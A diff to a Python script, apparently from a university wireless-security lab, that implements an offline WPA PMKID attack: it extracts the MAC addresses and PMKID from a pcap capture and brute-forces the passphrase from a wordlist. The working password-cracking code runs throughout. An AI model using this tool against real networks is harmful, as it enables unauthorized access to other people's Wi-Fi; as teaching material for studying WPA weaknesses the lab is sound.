@@ -9,11 +9,11 @@ utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
 sha-1 pour WPA2 ou MD5 pour WPA)
 """
 
-__author__ = "Abraham Rubinstein et Yann Lederrey"
-__copyright__ = "Copyright 2017, HEIG-VD"
+__author__ = "Caroline Monthoux et Rémi Poulard"
+__copyright__ = "Copyright 2020, HEIG-VD"
 __license__ = "GPL"
 __version__ = "1.0"
-__email__ = "abraham.rubinstein@heig-vd.ch"
+__email__ = "caroline.monthoux@heig-vd.ch, remi.poulard@heig-vd.ch"
 __status__ = "Prototype"
 
 from scapy.all import *
@@ -24,24 +24,20 @@ from scapy.layers.eap import EAPOL
 
 from files.pbkdf2 import *
 import hmac
-
 import re
+import argparse
 
+# Gestion des arguments
+parser = argparse.ArgumentParser(prog="WPA PMKID attack on capture", usage="python3 pmkid_attack.py", description="Read a pcap file and try to find packet with PMKID")
+parser.add_argument("-f", "--file", required=True, help="The password file")
 
-def mac_to_int(mac):
-    res = re.match('^((?:(?:[0-9a-f]{2}):){5}[0-9a-f]{2})$', mac.lower())
-    if res is None:
-        raise ValueError('invalid mac address')
-    return int(res.group(0).replace(':', ''), 16)
+args = parser.parse_args()
 
-
-def int_to_mac(macint):
-    if type(macint) != int:
-        raise ValueError('invalid integer')
-    return ':'.join(['{}{}'.format(a, b)
-                     for a, b
-                     in zip(*[iter('{:012x}'.format(macint))] * 2)])
-
+if args.file:
+    wordlist = args.file
+else:
+    # We ask how many SSID the user want
+    wordlist = "./passwords.txt"
 
 def customPRF512(key, A, B):
     """
@@ -74,10 +70,6 @@ def format_mac(mac):
     return mac.replace(":", "")
 
 
-def jeu(mac):
-    res = ""
-
-
 def get_ap_mac(packets):
     """
         Loop on all packets and try to found a Beacon frame to get the sender address of the frame. It should be the ap
@@ -85,8 +77,6 @@ def get_ap_mac(packets):
     """
     for packet in packets:
         if Dot11Beacon in packet:
-            print(hex(mac_to_int(packet.addr2)))
-            # print(binascii.unhexlify(format_mac(packet.addr2)))
             return packet.addr2
     return ""
 
@@ -115,13 +105,6 @@ def get_pmkid(packets, source, dest):
     return ""
 
 
-def create_signature(secret_key, string):
-    """ Create the signed message from api_key and string_to_sign """
-    string_to_sign = string.encode('utf-8')
-    hmac = HMAC.new(secret_key, string_to_sign, SHA)
-    return hmac.hexdigest()
-
-
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa = rdpcap("PMKID_handshake.pcap")
 
@@ -134,16 +117,6 @@ APmac = a2b_hex(format_mac(get_ap_mac(wpa)))
 Clientmac = a2b_hex(format_mac(get_client_mac(wpa, APmac)))
 pmkid_get = b2a_hex(get_pmkid(wpa, APmac, Clientmac)).decode()
 
-# This is the MIC contained in the 4th frame of the 4-way handshake
-# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
-# mic_to_test = b2a_hex(get_mic(wpa)).decode()
-# # mic_to_test = "36eef66540fa801ceee2fea9b7929b40"
-# print(mic_to_test)
-# B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce,
-#                                                                               SNonce)  # used in pseudo-random function
-# # data = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")  # cf "Quelques détails importants" dans la donnée
-# data = a2b_hex(get_data(wpa))
-
 print("\n\nValues used to get password")
 print("============================")
 print("SSID: ", ssid, "\n")
@@ -151,20 +124,25 @@ print("AP Mac: ", b2a_hex(APmac), "\n")
 print("CLient Mac: ", b2a_hex(Clientmac), "\n")
 print("PMKID: ", pmkid_get, "\n")
 
-f = open("passwords.txt", "r")
+n_words = len(list(open(wordlist, "rb")))
+
 print("Starting to brutforce passphrase")
 print("=============================\n")
-for x in f:
-    passPhrase = str.encode(x.strip('\n'))
 
-    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid.encode(), 4096, 32)
+from tqdm import tqdm
 
-    pmkid_calc = hmac.new(pmk, str.encode("PMK Name") + APmac + Clientmac, hashlib.sha1).hexdigest()[:32]
+with open(wordlist, 'rb') as f:
+    for line in tqdm(f, total=n_words, unit="word"):
+        passPhrase = line.decode().strip('\n').encode()
 
-    if pmkid_get == pmkid_calc:
-        print("PASSPHRASE FOUND !\n")
-        print("Passphrase:\t\t", x)
-        exit()
+        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+        pmk = pbkdf2(hashlib.sha1, passPhrase, ssid.encode(), 4096, 32)
+
+        pmkid_calc = hmac.new(pmk, str.encode("PMK Name") + APmac + Clientmac, hashlib.sha1).hexdigest()[:32]
+
+        if pmkid_get == pmkid_calc:
+            print("PASSPHRASE FOUND !\n")
+            print("Passphrase:\t\t", line)
+            exit()
 
 print("No passphrase found !")
